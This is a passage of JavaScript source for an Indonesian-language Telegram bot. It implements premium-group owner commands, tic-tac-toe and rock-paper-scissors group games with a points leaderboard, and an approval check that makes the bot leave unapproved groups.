  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: LIST PREMIUM GROUP
// /listpremgrup
// ================================
bot.command("listpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

// ================================
// COMMAND: /ttt
// ================================
bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (tttGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Tic Tac Toe yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    board: tttNewBoard(),
    players: {
      X: ctx.from,
      O: null
    },
    turn: "X",
    messageId: null,
    started: false
  };

  tttGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐆𝐀𝐌𝐄 🎮

❌ X : <b>${tttSafeName(ctx.from)}</b>
⭕ O : <b>Belum join</b>

<i>Klik tombol di bawah untuk join sebagai O</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// COMMAND: /tttstop
// ================================
bot.command("tttstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!tttGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Tic Tac Toe yang sedang berjalan.");
  }

  tttGames.delete(chatId);
  return ctx.reply("🛑 Game Tic Tac Toe dihentikan.");
});

// ================================
// COMMAND: /mypoint
// ================================
bot.command("mypoint", async (ctx) => {
  const row = getUserPoint(ctx.from.id);
  if (!row) {
    return ctx.reply("📌 Kamu belum punya point.");
  }

  return ctx.reply( `<blockquote>
🏅 𝐌𝐘 𝐏𝐎𝐈𝐍𝐓 🏅

👤 <b>${row.name}</b>
⭐ Point: <b>${row.points}</b>

🏆 Win: <b>${row.win}</b>
🤝 Draw: <b>${row.draw}</b>
💀 Lose: <b>${row.lose}</b>
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: /leaderboard
// ================================
bot.command("leaderboard", async (ctx) => {
  const top = getLeaderboard(10);

  if (!top.length) {
    return ctx.reply("📌 Leaderboard masih kosong.");
  }

  let text = `🏆 <b>LEADERBOARD TIC TAC TOE</b>\n\n`;
  top.forEach((u, i) => {
    text += `${i + 1}. <b>${u.name}</b> — ⭐ <b>${u.points}</b> (W:${u.win} D:${u.draw} L:${u.lose})\n`;
  });

  return ctx.reply(text, { parse_mode: "HTML" });
});

// ================================
// JOIN GAME
// ================================
bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = tttGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.players.O) {
      return ctx.answerCbQuery("⚠️ Slot O sudah diisi", { show_alert: true });
    }

    if (game.players.X.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player X", { show_alert: true });
    }

    game.players.O = ctx.from;
    game.started = true;

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Kamu join sebagai O");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// MOVE
// ================================
bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const index = Number(ctx.match[3]);

    const game = tttGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started) {
      return ctx.answerCbQuery("⚠️ Game belum dimulai", { show_alert: true });
    }

    const currentPlayer = game.turn === "X" ? game.players.X : game.players.O;
    if (!currentPlayer || currentPlayer.id !== ctx.from.id) {
      return ctx.answerCbQuery("❌ Bukan giliran kamu", { show_alert: true });
    }

    if (game.board[index] !== null) {
      return ctx.answerCbQuery("⚠️ Kotak ini sudah terisi", { show_alert: true });
    }

    game.board[index] = game.turn;

    const winner = tttWinner(game.board);

    if (winner) {
      const winnerUser = winner === "X" ? game.players.X : game.players.O;
      const loserUser = winner === "X" ? game.players.O : game.players.X;

      addWinPoint(winnerUser);
      addLosePoint(loserUser);

      await ctx.editMessageText( `<blockquote>
🏆 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

<i>🏅 Pemenang:</i>
<b>${tttSafeName(winnerUser)}</b> (${winner})

⭐ +3 point untuk pemenang
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Menang!");
    }

    if (tttDraw(game.board)) {
      addDrawPoint(game.players.X);
      addDrawPoint(game.players.O);

      await ctx.editMessageText( `<blockquote>
🤝 𝐓𝐈𝐂 𝐓𝐀𝐂 𝐓𝐎𝐄 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

<i>📜 Hasil:</i>
<b>SERI</b>

⭐ +1 point untuk kedua pemain
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: tttBoardKeyboard(chatId, gameId, game.board, true)
        }
      );

      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }

    game.turn = game.turn === "X" ? "O" : "X";

    await ctx.editMessageText(tttRender(game), {
      parse_mode: "HTML",
      reply_markup: tttBoardKeyboard(chatId, gameId, game.board)
    });

    return ctx.answerCbQuery("✅ Langkah diterima");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// NOOP
// ================================
bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => {
  return ctx.answerCbQuery("⚠️ Game sudah selesai");
});

// ================================
// /suit
// ================================
bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) {
    return ctx.reply("❌ Game ini hanya bisa dimainkan di grup.");
  }

  const chatId = ctx.chat.id;

  if (suitGames.has(chatId)) {
    return ctx.reply("⚠️ Sudah ada game Suit yang berjalan di grup ini.");
  }

  const gameId = Date.now().toString().slice(-6);

  const game = {
    id: gameId,
    p1: ctx.from,
    p2: null,
    p1Choice: null,
    p2Choice: null,
    started: false,
    messageId: null
  };

  suitGames.set(chatId, game);

  const sent = await ctx.reply( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(ctx.from)}</b>
👤 Player 2: <b>Belum join</b>

<i>Klik tombol di bawah untuk join game.</i>
</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gameId}` }]
        ]
      }
    }
  );

  game.messageId = sent.message_id;
});

// ================================
// /suitstop
// ================================
bot.command("suitstop", async (ctx) => {
  const chatId = ctx.chat.id;

  if (!suitGames.has(chatId)) {
    return ctx.reply("❌ Tidak ada game Suit yang berjalan.");
  }

  suitGames.delete(chatId);
  return ctx.reply("🛑 Game Suit dibatalkan.");
});

// ================================
// JOIN
// ================================
bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const game = suitGames.get(chatId);

    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (game.p2) {
      return ctx.answerCbQuery("⚠️ Player 2 sudah ada", { show_alert: true });
    }

    if (game.p1.id === ctx.from.id) {
      return ctx.answerCbQuery("❌ Kamu sudah jadi player 1", { show_alert: true });
    }

    game.p2 = ctx.from;
    game.started = true;

    await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 Player 1: <b>${suitName(game.p1)}</b>
👤 Player 2: <b>${suitName(game.p2)}</b>

Silakan masing-masing pilih:
<i>(klik tombol, pilihan hanya terlihat oleh sistem)</i>
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: suitPickKeyboard(chatId, gameId)
      }
    );

    return ctx.answerCbQuery("✅ Kamu join sebagai player 2");
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

// ================================
// PICK
// ================================
bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]);
    const gameId = String(ctx.match[2]);
    const choice = String(ctx.match[3]);

    const game = suitGames.get(chatId);
    if (!game || game.id !== gameId) {
      return ctx.answerCbQuery("❌ Game tidak ditemukan", { show_alert: true });
    }

    if (!game.started || !game.p2) {
      return ctx.answerCbQuery("⚠️ Game belum siap", { show_alert: true });
    }

    if (ctx.from.id === game.p1.id) {
      if (game.p1Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === game.p2.id) {
      if (game.p2Choice) return ctx.answerCbQuery("⚠️ Kamu sudah memilih", { show_alert: true });
      game.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Pilihan kamu: ${suitChoiceLabel(choice)}`, { show_alert: true });
    } else {
      return ctx.answerCbQuery("❌ Kamu bukan player game ini", { show_alert: true });
    }

    if (!game.p1Choice || !game.p2Choice) {
      const p1Done = game.p1Choice ? "✅" : "⌛";
      const p2Done = game.p2Choice ? "✅" : "⌛";

      await ctx.editMessageText( `<blockquote>
🎮 𝐒𝐔𝐈𝐓 𝐏𝐕𝐏 𝐆𝐀𝐌𝐄 🎮

👤 ${suitName(game.p1)} ${p1Done}
👤 ${suitName(game.p2)} ${p2Done}

<i>Menunggu kedua pemain memilih...</i>
</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: suitPickKeyboard(chatId, gameId)
        }
      ).catch(() => {});

      return;
    }

    // hasil
    const result = suitWin(game.p1Choice, game.p2Choice);

    if (result === "draw") {
      addSuitDraw(game.p1);
      addSuitDraw(game.p2);

      await ctx.editMessageText( `<blockquote>
🤝 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🤝

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

Hasil: <b>SERI</b>
</blockquote>`,
        { parse_mode: "HTML" }
      );

      suitGames.delete(chatId);
      return;
    }

    const winner = result === "p1" ? game.p1 : game.p2;
    const loser = result === "p1" ? game.p2 : game.p1;

    addSuitWin(winner);
    addSuitLose(loser);

    await ctx.editMessageText( `<blockquote>
🏆 𝐒𝐔𝐈𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈 🏆

👤 ${suitName(game.p1)} = ${suitChoiceLabel(game.p1Choice)}
👤 ${suitName(game.p2)} = ${suitChoiceLabel(game.p2Choice)}

<i>Pemenang:</i>
<b>${suitName(winner)}</b>

⭐ +2 point
</blockquote>`,
      { parse_mode: "HTML" }
    );

    suitGames.delete(chatId);
  } catch {
    return ctx.answerCbQuery("❌ Error");
  }
});

//---------(DETEKSI BOT JOIN GB ) ---------//
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    // bot baru masuk / diundang ke group
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      // notif ke owner
      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      // simpan pending + timer 10 menit
      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});


bot.launch()